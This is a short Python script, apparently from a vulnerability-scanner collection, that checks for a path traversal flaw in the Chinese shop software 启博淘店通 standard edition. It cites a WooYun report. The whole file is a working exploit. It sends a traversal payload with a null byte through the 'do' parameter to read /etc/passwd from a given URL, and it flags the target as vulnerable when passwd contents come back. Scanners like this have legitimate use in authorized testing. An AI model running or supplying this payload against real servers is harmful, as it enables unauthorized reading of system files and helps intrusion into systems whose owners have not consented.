#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 启博淘店通标准版任意文件遍历漏洞
referer: http://www.wooyun.org/bugs/wooyun-2015-0148274
author: Lucifer
description: /?mod=goods&do=index&class_id=25,参数do未过滤存在任意文件遍历。
'''
import sys
import requests
import warnings
from termcolor import cprint

class shop360_do_filedownload_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/?mod=goods&do=../../../../../../../../../etc/passwd%00.jpg&class_id=25"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"root:" in req.text and r"/bin/bash" in req.text:
                cprint("[+]存在启博淘店通标准版任意文件遍历漏洞...(高危)\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = shop360_do_filedownload_BaseVerify(sys.argv[1])
    testVuln.run()